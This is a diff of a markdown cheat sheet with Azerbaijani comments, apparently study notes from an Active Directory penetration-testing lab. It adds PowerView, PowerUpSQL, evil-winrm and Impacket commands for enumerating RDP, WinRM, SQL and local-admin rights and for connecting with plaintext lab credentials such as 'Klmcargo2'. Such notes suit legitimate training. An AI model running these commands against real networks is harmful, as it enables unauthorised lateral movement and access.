@@ -41,25 +41,61 @@ Get-ADComputer -Filter 'ServicePrincipalName -like "*mssql*"' | Select name,serv
 
 ## Privileged Access
 ```
-# Remote Desktop
-Import-Module .\PowerView.ps1
-Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
-Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
 
+Import-Module .\PowerView.ps1
+Import-Module .\PowerUpSQL.ps1
+
+# CanRDP (Remote Desktop Access)
+## Konkret bir hostda RDP icazəsi olanları tapmaq
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+## Bütün domendə GPO vasitəsilə RDP hüququ verilmiş istifadəçilər
+Get-DomainGPOUserLocalGroupMapping -LocalGroup "Remote Desktop Users" | select ObjectIdentifier, MemberName, GPODisplayName
+
+# CanPSRemote (PowerShell Remoting / WinRM)
+## Konkret hostda WinRM icazəsi olanlar
+Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+## "Remote Management Users" qrupunun üzvlərini tapmaq
+Get-DomainGroupMember -Identity "Remote Management Users" | select MemberName, GroupName
+
+## Konkret Userin bütün hostlar üzərində PSRemote icazəsi
+(Get-DomainComputer).dnshostname | Out-File -FilePath "hosts.txt" -Encoding ascii
+
+Get-Content .\hosts.txt | Where-Object { $_ -ne "" } | ForEach-Object { Get-NetLocalGroupMember -ComputerName $_.Trim() -GroupName "Remote Management Users" -ErrorAction SilentlyContinue } | Where-Object { $_.MemberName -match "bdavis" }
+
+
+# SQLAdmin (Database Access)
+## Şəbəkədəki bütün SQL serverləri (SPN vasitəsilə) tapmaq
+Get-DomainUser | Where-Object {$_.serviceprincipalname -ne $null} | Select-Object samaccountname, serviceprincipalname
+
+## SQL Admins qrupunun üzvlərini siyahılamaq
+Get-DomainGroupMember -Identity "SQL Admins" | select MemberName
+
+# Müəyyən bir istifadəçinin şəbəkədə harada Local Admin olduğunu tapmaq
+Find-LocalAdminAccess -UserName "Hədəf_İstifadəçi"
+
+# PowerShell Remoting (WinRM) - Windows-dan
 $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
 $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+## Sessiyanı başlatmaq
 Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+## Sessiyadan çıxmaq
 Exit-PSSession
 
-# WINRM
+# Evil-WinRM - Linux-dan (Kali)
+## Quraşdırma
 gem install evil-winrm
-evil-winrm -i 10.129.201.234 -u forend
 
-# SQL Server
-cd .\PowerUpSQL\
-Import-Module .\PowerUpSQL.ps1
+## Qoşulma
+evil-winrm -i 10.129.201.234 -u forend -p 'Klmcargo2'
+
+# PowerUpSQL (Windows):
+## SQL instansiyalarını tapmaq
 Get-SQLInstanceDomain
-Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+## SQL sorğusu icra etmək (Versiyanı yoxlamaq)
+Get-SQLQuery -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version' -Verbose
 
+# Impacket (Linux):
+## Windows Authentication istifadə edərək SQL-ə qoşulmaq
 mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
 ```
